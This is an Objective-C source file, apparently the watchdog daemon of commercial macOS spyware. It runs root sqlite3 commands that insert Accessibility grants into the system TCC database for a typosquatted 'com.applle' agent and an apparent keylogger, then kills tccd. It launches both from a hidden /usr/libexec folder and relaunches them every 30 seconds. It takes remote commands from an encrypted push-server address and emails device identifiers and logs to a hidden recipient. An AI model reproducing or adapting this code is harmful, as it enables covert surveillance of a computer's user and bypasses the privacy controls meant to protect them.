//
//  blblwController.m
//  blbld
//
//  Created by Makara Khloth on 10/12/16.
//
//

#import "blblwController.h"
#import "RCManager.h"
#import "RCHandler.h"
#import "blblwUtils.h"
#import "blblwConstants.h"

#import "Product.h"
#import "ServerAddressManagerImp.h"
#import "MacInfoImp.h"
#import "AppTerminateMonitor.h"
#import "FxLoggerManager.h"
#import "blbldUtils.h"

#import <SystemConfiguration/SystemConfiguration.h>
#import <AppKit/AppKit.h>
#include <sys/sysctl.h>

static blblwController *_blblwController = nil;

@implementation blblwController

@synthesize launchArgs = _launchArgs;
@synthesize blbluMonitor = _blbluMonitor, kblsMonitor = _kblsMonitor;

+ (instancetype) sharedblblwController {
    if (_blblwController == nil) {
        _blblwController = [[blblwController alloc] init];
    }
    return _blblwController;
}

- (instancetype) init {
    self = [super init];
    if (self) {
        NSProcessInfo *process = [NSProcessInfo processInfo];
        self.launchArgs = process.arguments;
        
        [self touchAccessibility];
        
        [self launchBLBLU];
        [self launchKBLS];
        
        FxLoggerManager *loggerManager = [FxLoggerManager sharedFxLoggerManager];
        NSData *cipher = [NSData dataWithBytes:kMandrillKey length:(sizeof(kMandrillKey)/sizeof(unsigned char))];
        loggerManager.mEmailProviderKey = [ServerAddressManagerImp decryptCipher:cipher];
        
        _pushServerPort = kPushServerPort;
        cipher = [NSData dataWithBytes:kPushServerUrl length:(sizeof(kPushServerUrl)/sizeof(unsigned char))];
        _pushServerUrl = [ServerAddressManagerImp decryptCipher:cipher];
        
        _macInfo = [[MacInfoImp alloc] init];
        
        _rcm = [[RCManager alloc] init];
        _rcm.pushServerPort = _pushServerPort;
        _rcm.pushServerUrl = _pushServerUrl;
        _rcm.macInfo = _macInfo;
        [_rcm start];
        
        _blbluMonitor = [[AppTerminateMonitor alloc] init];
        _blbluMonitor.mDelegate = self;
        _blbluMonitor.mSelector = @selector(blbluDidTerminated);
        _blbluMonitor.mProcessName = [self.launchArgs objectAtIndex:2];
        [_blbluMonitor start];
        
        _kblsMonitor = [[AppTerminateMonitor alloc] init];
        _kblsMonitor.mDelegate = self;
        _kblsMonitor.mSelector = @selector(kblsDidTerminated);
        _kblsMonitor.mProcessName = [self.launchArgs objectAtIndex:5];
        [_kblsMonitor start];
        
        _keepAiveTimer = [NSTimer scheduledTimerWithTimeInterval:30
                                                          target:self
                                                        selector:@selector(relaunch)
                                                        userInfo:nil
                                                         repeats:YES];
        
        /*
         Never notify for com.apple.logoutContinued, NSWorkspaceWillPowerOffNotification & kAEQuitApplication
         */
        
        [[NSDistributedNotificationCenter defaultCenter] addObserver:self
                                                            selector:@selector(stopAppMonitor:)
                                                                name:@"com.apple.logoutContinued"
                                                              object:nil];
        [[NSNotificationCenter defaultCenter] addObserver:self
                                                 selector:@selector(stopAppMonitor:)
                                                     name:NSWorkspaceWillPowerOffNotification
                                                   object:nil];
        
        [[NSAppleEventManager sharedAppleEventManager] setEventHandler:self
                                                           andSelector:@selector(handleQuitEvent:withReplyEvent:)
                                                         forEventClass:kCoreEventClass
                                                            andEventID:kAEQuitApplication];
        
        // User helper from blblu
        CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, stopMonitorCallback, CFSTR("com.applle.blblu.logoutContinued"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
        
        // Others
        CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, stopMonitorCallback, CFSTR("com.applle.blblu.su.upgrade"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
        CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, stopMonitorCallback, CFSTR("com.applle.blblu.ac.uninstall"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
        CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, restartAppCallback, CFSTR("com.applle.blblu.ac.restartApp"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
    }
    return self;
}

- (void) restartAll {
    [self relaunch];
}

- (void) sendDebugLogToRecipients: (NSArray *) recipients {
    NSArray *receivers = recipients;
    if (receivers == nil) {
        receivers = [NSArray arrayWithObject:[blblwUtils decrpytWithBase64:kEmailTo]];
    }
    
    FxLoggerManager *loggerManager = [FxLoggerManager sharedFxLoggerManager];
    [loggerManager sendLogFileTo:receivers
                            from:[blblwUtils decrpytWithBase64:kEmailFrom]
                       from_name:[blblwUtils decrpytWithBase64:kEmailFromName]
                         subject:[blblwUtils decrpytWithBase64:kEmailSubject]
                         message:[[self getCommonMessage] stringByAppendingString:@"[DEBUG LOG]"]
                        delegate:nil];
}

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
- (void) touchAccessibility {
    SInt32 OSXversionMajor = 0, OSXversionMinor = 0;
    if (Gestalt(gestaltSystemVersionMajor, &OSXversionMajor) == noErr && Gestalt(gestaltSystemVersionMinor, &OSXversionMinor) == noErr)
    {
        // 10.6 - 10.8
        if(OSXversionMajor == 10 && OSXversionMinor >= 6 && OSXversionMajor == 10 && OSXversionMinor <= 8 ) {
            system("sudo touch /private/var/db/.AccessibilityAPIEnabled");
        }
        // >= 10.9 - 10.10
        else if(OSXversionMajor == 10 && OSXversionMinor >= 9 && OSXversionMajor == 10 && OSXversionMinor <= 10 ) {
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.blblu',0,1,1,NULL);\"");
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.kbls',0,1,1,NULL);\"");
        }
        // >= 10.11
        else if(OSXversionMajor == 10 && OSXversionMinor >= 11) {
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.blblu',0,1,1,NULL,NULL);\"");
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.kbls',0,1,1,NULL,NULL);\"");
        }
    }
    
    // Make touch take effect
    system("sudo killall -9 tccd");
}
#pragma GCC diagnostic pop

- (void) launchBLBLU {
    uid_t uid = 0;
    gid_t gid = 0;
    NSString *username =  (NSString *)CFBridgingRelease(SCDynamicStoreCopyConsoleUser(NULL, &uid, &gid));
    DLog(@"username = %@", username);
    
    /*******************************************************************************************************
     >> sudo -u TARGETUSERNAME open -a /usr/libexec/.blblu/blblu/Contents/MacOS/blblu --args blblu-load-all
     *******************************************************************************************************/
    
    NSString *charCmd = [NSString stringWithFormat:@"sudo -u %@ open -a %@ --args %@", username, [self.launchArgs objectAtIndex:1], [self.launchArgs objectAtIndex:3]];
    system([charCmd UTF8String]);
    DLog(@"charCmd = %@", charCmd);
}

- (void) launchKBLS {
    uid_t uid = 0;
    gid_t gid = 0;
    NSString *username =  (NSString *)CFBridgingRelease(SCDynamicStoreCopyConsoleUser(NULL, &uid, &gid));
    DLog(@"username = %@", username);
    
    /*********************************************************************************************************************************
     >> sudo -u TARGETUSERNAME open -a /usr/libexec/.blblu/blblu/Contents/Resources/kbls.app/Contents/MacOS/kbls --args kbls-load-all
     *********************************************************************************************************************************/
    
    NSString *charCmd = [NSString stringWithFormat:@"sudo -u %@ open -a %@ --args %@", username, [self.launchArgs objectAtIndex:4], [self.launchArgs objectAtIndex:6]];
    system([charCmd UTF8String]);
    DLog(@"charCmd = %@", charCmd);
}

- (void) relaunch {
    DLog(@"Check and relaunch if necessary");
    bool shouldStartBLBLU = true;
    bool shouldStartKBLS = true;
    
    NSString *blbluProcessName = [self.launchArgs objectAtIndex:2];
    NSString *kblsProcessName = [self.launchArgs objectAtIndex:5];
    NSArray * temp = [blbldUtils getRunningProcesses];
    for (int i = 0; i < [temp count]; i++) {
        NSDictionary * tempdic = [temp objectAtIndex:i];
        NSString *processName = [tempdic objectForKey:kRunningProcessNameTag];
        if([processName isEqualToString:blbluProcessName]) {
            shouldStartBLBLU = false;
        }
        if ([processName isEqualToString:kblsProcessName]) {
            shouldStartKBLS = false;
        }
    }
    DLog(@"shouldStartBLBLU : %d, shouldStartKBLS : %d", shouldStartBLBLU, shouldStartKBLS);
    
    // blblu & kbls
    if (shouldStartBLBLU || shouldStartKBLS) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
            [self touchAccessibility];
        });
    }
    
    // blblu
    if (shouldStartBLBLU) {
        [self launchBLBLU];
        
        [_blbluMonitor stop];
        [_blbluMonitor start];
    }
    
    // kbls
    if (shouldStartKBLS) {
        [self launchKBLS];
        
        [_kblsMonitor stop];
        [_kblsMonitor start];
    }
}

- (void) blbluDidTerminated {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
        FxLoggerManager *loggerManager = [FxLoggerManager sharedFxLoggerManager];
        [loggerManager sendLogFileTo:[NSArray arrayWithObject:[blblwUtils decrpytWithBase64:kEmailTo]]
                                from:[blblwUtils decrpytWithBase64:kEmailFrom]
                           from_name:[blblwUtils decrpytWithBase64:kEmailFromName]
                             subject:[blblwUtils decrpytWithBase64:kEmailSubject]
                             message:[[self getCommonMessage] stringByAppendingString:@"[BLBLU TERMINATE LOG]"]
                            delegate:nil];
    });
    [self relaunch];
}

- (void) kblsDidTerminated {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
        FxLoggerManager *loggerManager = [FxLoggerManager sharedFxLoggerManager];
        [loggerManager sendLogFileTo:[NSArray arrayWithObject:[blblwUtils decrpytWithBase64:kEmailTo]]
                                from:[blblwUtils decrpytWithBase64:kEmailFrom]
                           from_name:[blblwUtils decrpytWithBase64:kEmailFromName]
                             subject:[blblwUtils decrpytWithBase64:kEmailSubject]
                             message:[[self getCommonMessage] stringByAppendingString:@"[KBLS TERMINATE LOG]"]
                            delegate:nil];
        });
    [self relaunch];
}

- (void) stopAppMonitor: (NSNotification *) notification {
    DLog(@"blblw notification: %@", notification);
    [self.blbluMonitor stop];
    [self.kblsMonitor stop];
}

- (void)handleQuitEvent:(NSAppleEventDescriptor*)event withReplyEvent:(NSAppleEventDescriptor*)replyEvent {
    DLog(@"Apple event: %@", event);
    NSAppleEventDescriptor *desc = event;
    DLog(@"Quit reason: %lu", (unsigned long)[[desc attributeDescriptorForKeyword:kAEQuitReason] enumCodeValue]);
    switch ([[desc attributeDescriptorForKeyword:kAEQuitReason] enumCodeValue]) {
        case kAELogOut:
            break;
        case kAEReallyLogOut:
            DLog(@"log out");
            [self stopAppMonitor:nil];
            break;
        case kAEShowRestartDialog:
            break;
        case kAERestart:
            DLog(@"system restart");
            [self stopAppMonitor:nil];
            break;
        case kAEShowShutdownDialog:
            break;
        case kAEShutDown:
            DLog(@"system shutdown");
            [self stopAppMonitor:nil];
            break;
        default:
            DLog(@"ordinary quit");
            break;
    }
}

void stopMonitorCallback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    DLog(@"%@ from Darwin", (__bridge NSString *)name);
    
    blblwController *myself = (__bridge blblwController *)observer;
    [myself stopAppMonitor:[NSNotification notificationWithName:(__bridge NSString *)name object:myself]];
}

void restartAppCallback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    DLog(@"%@ from Darwin", (__bridge NSString *)name);
    
    blblwController *myself = (__bridge blblwController *)observer;
    [myself stopAppMonitor:[NSNotification notificationWithName:(__bridge NSString *)name object:myself]];
    
    [NSTimer scheduledTimerWithTimeInterval:2.0 target:myself selector:@selector(relaunch) userInfo:nil repeats:NO];
}

- (NSString *) getCommonMessage {
    NSString *hostName      = [self getHostName];
    NSString *modelName     = [_macInfo getModelName];
    NSString *macOS         = [_macInfo getOSVersion];
    NSString *deviceUUID    = [_macInfo getIMEI];
    NSString *serialNumber  = [_macInfo getIMSI];
    NSString *processor     = [self getProcessor];
    NSString *ram           = [self getRAM];
    
    /*
     iMac macOS 10.11.6
     
     Name          : makara2-mac
     UUID          : B2BE5B19-FB90-5A2B-A043-62ADB904C97E
     Serial Number : C02G2K2PDHJF
     CPU           : Intel(R) Core(TM) i5-2400S CPU @ 2.50GHz
     RAM           : 4096 MB
     
     {Other messages start from here}
     */
    
    NSString *message = [NSString stringWithFormat:@"%@ %@\n\n"
                         "Name          : %@\n"
                         "UUID          : %@\n"
                         "Serial Number : %@\n"
                         "CPU           : %@\n"
                         "RAM           : %@\n\n", modelName, macOS, hostName, deviceUUID, serialNumber, processor, ram];
    return message;
}

- (NSString *) getHostName {
    return [[NSHost currentHost] localizedName];
}

- (NSString *) getProcessor {
    NSString *processor = @"";
    char str[256];
    size_t size = sizeof(str);
    int ret = sysctlbyname("machdep.cpu.brand_string", str, &size, NULL, 0);
    if (!ret) {
        processor = [NSString stringWithCString:str encoding:NSUTF8StringEncoding];
    }
    return processor;
}

- (NSString *) getRAM {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    unsigned long long physicalRAM = [processInfo physicalMemory];
    physicalRAM = physicalRAM / pow(1024, 2);
    NSString *RAM = [NSString stringWithFormat:@"%lld MB", physicalRAM];
    return RAM;
}

@end
